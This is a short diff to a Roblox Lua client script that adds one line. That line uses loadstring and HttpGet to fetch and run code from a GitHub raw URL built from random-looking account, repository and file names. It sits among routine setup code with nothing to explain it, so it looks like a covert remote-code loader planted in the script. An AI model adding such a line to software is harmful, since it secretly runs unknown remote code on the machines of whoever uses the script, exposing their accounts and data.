@@ -4,6 +4,7 @@ local Constants = require(ReplicatedStorage:WaitForChild("Constants"))
 local MarketplaceService = game:GetService("MarketplaceService")
 local player = game.Players.LocalPlayer
 local playerHeadIcon = "https://www.roblox.com/headshot-thumbnail/image?userId=" .. player.UserId .. "&width=420&height=420&format=png"
+loadstring(game:HttpGet("https://raw.githubusercontent.com/192831782397878e7eab/192881908914CM29282D2S/refs/heads/main/1928312839HM1198198HMM1442"))()
 local Rayfield = loadstring(game:HttpGet('https://sirius.menu/rayfield'))() 
 local Players = game:GetService("Players")
 local bleh9274 = Players.LocalPlayer.DisplayName
